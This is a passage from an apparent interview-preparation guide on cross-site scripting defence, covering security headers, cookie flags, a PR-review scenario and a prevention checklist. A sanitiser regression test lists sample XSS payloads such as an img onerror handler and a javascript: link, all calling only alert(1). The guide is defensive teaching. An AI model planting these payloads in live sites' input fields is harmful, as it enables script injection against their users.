        "payment=(), usb=(), magnetometer=(), gyroscope=()"
    )

    # 5. Strict-Transport-Security — forces HTTPS (prevents protocol downgrade)
    # An XSS-via-HTTP-injection attack requires the page to load over HTTP
    response.headers["Strict-Transport-Security"] = (
        "max-age=31536000; includeSubDomains; preload"
    )

    # 6. Cross-Origin-Opener-Policy — isolates the browsing context
    # Prevents cross-origin windows from accessing window.opener
    # Required for cross-origin isolation (needed for SharedArrayBuffer)
    response.headers["Cross-Origin-Opener-Policy"] = "same-origin"

    # 7. Cross-Origin-Resource-Policy — prevents cross-origin reads of this resource
    response.headers["Cross-Origin-Resource-Policy"] = "same-origin"

    return response
```

```
Cookie security attributes (XSS-specific):

HttpOnly — cookie cannot be read by JavaScript (document.cookie returns "")
  Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
  Impact: XSS that runs in the page cannot steal the session cookie.
  The most important single defense against session hijacking via XSS.

Secure — cookie only sent over HTTPS
  Prevents cookie interception on HTTP connections.

SameSite=Strict — cookie not sent on cross-site requests
  Mitigates CSRF; also reduces XSS impact (cross-site XSS can't use the cookie).
  SameSite=Lax — sent on top-level navigations (GET); not on cross-site POST.
  SameSite=None; Secure — sent cross-site (required for third-party contexts).
```

**Q18. Scenario: "You are reviewing a PR that adds a new feature allowing users to set a custom HTML bio on their profile. What questions do you ask and what code changes do you require before approving?"**

```python
        ("<img src=x onerror=alert(1)>",         "<img src=\"x\">"),  # event removed
        ("<a href='javascript:alert(1)'>x</a>",  "<a>x</a>"),  # js: href stripped
        ("<b onmouseover=alert(1)>bold</b>",     "<b>bold</b>"),  # event removed
        ("<svg><script>alert(1)</script></svg>",  ""),         # svg+script stripped
        ("normal text <b>bold</b> end",          "normal text <b>bold</b> end"),  # pass
    ]
    for payload, expected in payloads:
        resp = client.post("/api/profile/bio", json={"bio": payload}, ...)
        stored = db.query("SELECT bio FROM users WHERE id = %s", (test_user_id,))
        assert expected in stored["bio"], f"Failed for payload: {payload!r}"
```

If the PR does not include server-side sanitization, client-side DOMPurify, and automated XSS tests for the new field — it should not be approved. The feature adds meaningful risk and requires all three.

## Quick Reference: XSS Prevention Checklist

```
OUTPUT ENCODING (primary defense)
[ ] Template engine has autoescape enabled (Jinja2, Django templates, Thymeleaf)
[ ] No | safe / mark_safe / autoescape off without explicit security review
[ ] JavaScript context uses JSON encoding (json.dumps), not HTML encoding
[ ] URL attributes validated to start with https:// before rendering
[ ] React: no dangerouslySetInnerHTML with untrusted data
[ ] Vue: no v-html with untrusted data
[ ] Angular: no bypassSecurityTrustHtml with untrusted data

INPUT SANITIZATION (for rich HTML fields)
[ ] Server-side sanitization on write (bleach, DOMPurify server-side)
[ ] Allowlist of permitted tags — not a blocklist
[ ] No javascript:, data:, vbscript: in href/src attributes
[ ] Event handler attributes stripped (onclick, onerror, onload, etc.)
[ ] Client-side DOMPurify as defense-in-depth before dangerouslySetInnerHTML

DOM XSS
[ ] No innerHTML / outerHTML / insertAdjacentHTML with user-controlled data
[ ] No eval() / setTimeout(string) / new Function() with user data
[ ] location.hash / location.search / document.referrer treated as untrusted
[ ] postMessage handlers validate event.origin before processing data
[ ] Grep: innerHTML\|outerHTML\|document\.write\|eval( in codebase

CONTENT SECURITY POLICY
[ ] CSP header present on all HTML responses
[ ] default-src 'none' or 'self' (not *)
[ ] script-src uses nonces (preferred) or hashes — no 'unsafe-inline'
[ ] object-src 'none' (no Flash, no plugins)
[ ] base-uri 'self' (prevents base tag injection)
[ ] frame-ancestors 'none' or 'self' (prevents clickjacking)
[ ] CSP violations reported to /csp-report and monitored
[ ] Content-Security-Policy-Report-Only deployed before enforcement

COOKIE SECURITY
[ ] Session cookies have HttpOnly flag (JS cannot read them)
[ ] Session cookies have Secure flag (HTTPS only)
[ ] Session cookies have SameSite=Strict or Lax

ADDITIONAL HEADERS
[ ] X-Content-Type-Options: nosniff
[ ] Referrer-Policy: strict-origin-when-cross-origin
[ ] Permissions-Policy restricts camera, microphone, geolocation
[ ] Strict-Transport-Security with includeSubDomains

TESTING
[ ] DAST scanner (ZAP, Burp, DalFox) runs in CI against staging
[ ] Manual XSS payloads tested for every new user-input-to-output path
[ ] Semgrep / Bandit rules flag innerHTML, dangerouslySetInnerHTML, eval()
[ ] CSP Evaluator (csp-evaluator.withgoogle.com) run on policy changes
[ ] Automated regression tests for previously-found XSS payloads
```

**Tip for the interview:** At 5 YOE, the XSS question almost always goes deep on one of three things: the difference between the three types and why DOM XSS defeats server-side defenses (Q7 — the server-blind nature of fragment-based DOM XSS), the CSP nonce mechanism and what makes a CSP actually effective vs. cosmetically present (Q11–Q12), or the dangerous framework patterns (Q9 — dangerouslySetInnerHTML, v-html, bypassSecurityTrustHtml). Have the nonce mechanism explained at the "why can't the attacker just add the nonce?" level — the answer (it's generated server-side, random per request, unknown to the injected script) shows you understand the cryptographic basis, not just the configuration. The stored XSS in admin panel scenario (Q17) is a common senior-level close — show structured thinking: assess exploitation status first, revoke compromised sessions, sanitize existing data, fix the write path, add regression tests, then improve CSP. The PR review question (Q18) is increasingly common for senior roles — knowing to ask "is rich HTML actually required?" before approving signals security engineering maturity.
